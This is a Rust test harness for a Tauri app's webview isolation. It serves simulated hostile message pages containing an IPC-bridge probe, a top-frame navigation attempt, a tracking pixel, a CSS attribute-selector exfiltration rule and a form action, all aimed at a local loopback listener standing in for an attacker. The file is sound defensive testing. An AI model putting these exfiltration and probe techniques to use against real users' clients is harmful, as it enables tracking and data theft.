//! Webview isolation matrix: which layer actually blocks what.
//!
//! Serves deliberately hostile "message" documents over the `petrel-msg`
//! custom protocol and observes, **from the Rust side**, what the webview
//! actually allowed. Server-side observation matters: a frame that is properly
//! isolated cannot report on itself, so absence-of-beacon is the evidence.
//!
//! Frames under test:
//!   A `<iframe sandbox>`                — scripts must NOT run (the shipping config)
//!   B `<iframe sandbox="allow-scripts">` — scripts DO run; the adversarial case:
//!                                          even then, no IPC bridge and no network
//!
//! Signals:
//!   `petrel-msg://localhost/beacon/*` hits are logged here.
//!   A hit on the loopback leak-listener means remote content escaped CSP.

use std::io::Read;
use std::net::TcpListener;
use std::sync::atomic::{AtomicU16, Ordering};

use tauri::http::{Request, Response};

pub static LEAK_PORT: AtomicU16 = AtomicU16::new(0);

/// Loopback listener standing in for a tracking pixel's host. Any connection
/// means the webview fetched sender-controlled remote content.
pub fn start_leak_listener() -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind leak listener");
    let port = listener.local_addr().expect("addr").port();
    LEAK_PORT.store(port, Ordering::Relaxed);
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            match stream {
                Ok(mut s) => {
                    let mut buf = [0u8; 256];
                    let n = s.read(&mut buf).unwrap_or(0);
                    let head = String::from_utf8_lossy(&buf[..n]);
                    let first = head.lines().next().unwrap_or("").to_string();
                    eprintln!("[s2] LEAK: remote content fetched -> {first}");
                }
                Err(e) => eprintln!("[s2] leak listener error: {e}"),
            }
        }
    });
    port
}

fn html(body: String, csp: &str) -> Response<Vec<u8>> {
    Response::builder()
        .status(200)
        .header("Content-Type", "text/html; charset=utf-8")
        .header("Content-Security-Policy", csp)
        .body(body.into_bytes())
        .expect("build response")
}

/// A hostile message document. `tag` distinguishes the two frames' beacons.
fn test_document(tag: &str, leak_port: u16) -> String {
    format!(
        r#"<!doctype html>
<html><head><meta charset="utf-8"><title>message {tag}</title></head>
<body style="font:13px system-ui;padding:10px;background:#fff;color:#182730">
<p><b>Simulated hostile message ({tag})</b></p>
<p style="color:#0e7c86">inline style applied (expected: allowed)</p>

<!-- 1. script execution + IPC reachability -->
<script>
  (function () {{
    var ipc = (typeof window.__TAURI_INTERNALS__ !== 'undefined') ? 'ipc-PRESENT' : 'ipc-absent';
    new Image().src = 'petrel-msg://localhost/beacon/{tag}/script-ran/' + ipc;
    try {{ fetch('petrel-msg://localhost/beacon/{tag}/fetch-worked'); }} catch (e) {{}}
    try {{ top.location = 'https://example.com/'; }} catch (e) {{}}
  }})();
</script>

<!-- 2. remote content (tracking pixel stand-in) -->
<img src="http://127.0.0.1:{leak_port}/tracker.gif?f={tag}" width="1" height="1" alt="">

<!-- 3. same-origin proof: our own scheme is allowed for images -->
<img src="petrel-msg://localhost/beacon/{tag}/img-loaded" width="1" height="1" alt="">

<!-- 4. CSS exfiltration attempt (attribute-selector class) -->
<style>
  input[value^="a"] {{ background: url("http://127.0.0.1:{leak_port}/css-exfil?f={tag}"); }}
</style>
<input value="abc">

<!-- 5. form + external navigation surface -->
<form action="http://127.0.0.1:{leak_port}/form" method="get"><input name="x" value="1"></form>
</body></html>"#
    )
}

pub fn handle(request: &Request<Vec<u8>>) -> Response<Vec<u8>> {
    let uri = request.uri().to_string();
    let path = request.uri().path().to_string();
    let leak_port = LEAK_PORT.load(Ordering::Relaxed);

    if path.starts_with("/beacon/") {
        // Observed side effect: log it and return a 1x1 GIF.
        eprintln!("[s2] BEACON {path}");
        let gif: [u8; 43] = [
            0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00,
            0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C,
            0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00,
            0x3B,
        ];
        return Response::builder()
            .status(200)
            .header("Content-Type", "image/gif")
            .body(gif.to_vec())
            .expect("gif");
    }

    eprintln!("[s2] DOC request {uri}");
    // The per-message policy: no default source,
    // images only via our own scheme, and the sanitizer's inline styles allowed.
    let strict = "default-src 'none'; img-src petrel-msg: http://petrel-msg.localhost; \
                  style-src 'unsafe-inline'; style-src-attr 'unsafe-inline'; script-src 'none'; \
                  form-action 'none'; frame-ancestors 'self'";
    // Frame C simulates *total* CSP failure, isolating the question: does the
    // `sandbox` attribute alone (opaque origin, no allow-same-origin) keep the
    // IPC bridge out and contain the document? This is the layer that must hold
    // when everything above it fails.
    // NB: CSP `*` does not match non-network (custom) schemes, so the beacon
    // channel must be named explicitly or frame C cannot report its findings.
    let permissive = "default-src * 'unsafe-inline' 'unsafe-eval' data: \
                      petrel-msg: http://petrel-msg.localhost";
    let (tag, csp) = match () {
        _ if path.contains("/doc/c") => ("C", permissive),
        _ if path.contains("/doc/b") => ("B", strict),
        _ => ("A", strict),
    };
    html(test_document(tag, leak_port), csp)
}
